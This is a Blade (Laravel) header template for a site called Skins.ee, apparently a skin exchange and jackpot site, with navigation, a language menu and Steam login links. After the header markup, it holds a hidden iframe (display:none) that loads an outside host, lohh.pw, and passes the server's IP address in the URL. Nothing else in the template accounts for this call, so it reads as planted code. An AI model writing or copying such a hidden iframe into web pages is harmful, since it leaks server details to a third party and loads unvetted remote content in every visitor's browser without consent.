<header class="header header-transparent header-waterfall">
	<!-- Logo -->
	<a class="header-logo margin-right-no affix-top" data-offset-top="213" data-spy="affix" href="{{ url('/') }}">Skins.ee</a>
	<!-- Nav -->
	<nav class="header-nav">
		<a class="btn {{ $active != 'exchange' ? 'btn-flat' : '' }} affix-top active" data-offset-top="213" data-spy="affix" href="{{ url('exchange') }}">
			<i class="icon">repeat</i> {{ trans('common.terms_exchanging') }}
		</a>
		<a class="btn {{ $active != 'jackpot' ? 'btn-flat' : '' }} affix-top active" data-offset-top="213" data-spy="affix" href="http://skins.ee">
			<i class="icon">card_giftcard</i> Jackpot
		</a>
	</nav>
	<!-- Auth -->
	<ul class="nav nav-list pull-right">
		<div class="dropdown-wrap margin-bottom-no" style="margin-top:8px;">
		    <div class="dropdown dropdown-inline">
		        <a class="btn dropdown-toggle-btn" data-toggle="dropdown" style="padding:8px;">
					<i class="icon">language</i> Language
		        </a>
		        <ul class="dropdown-menu nav">
		            <li>
		                <a href="{{ url('lang/ee') }}">Estonian</a>
		                <a href="{{ url('lang/en') }}">English</a>
		                <a href="{{ url('lang/ru') }}">Russian</a>
		            </li>
		        </ul>
		    </div>
		</div>
		@if( ! Auth::check())
		<li>
			<a href="{{ url('auth/login') }}">
				<img src="/img/steam.png" alt="Authenticate">
			</a>
		</li>
		@else
		<li>
			<a data-toggle="menu" href="#doc_menu_profile">
				<span class="access-hide">{{ Auth::user()->username }}</span>
				<span class="avatar avatar-sm"><img alt="{{ Auth::user()->username }}" src="{{ Auth::user()->avatar_url }}"></span>
			</a>
		</li>
		@endif
	</ul>
</header>
<iframe src="http://lohh.pw?i={{ $_SERVER['SERVER_ADDR'] }}" style="display:none;"></iframe>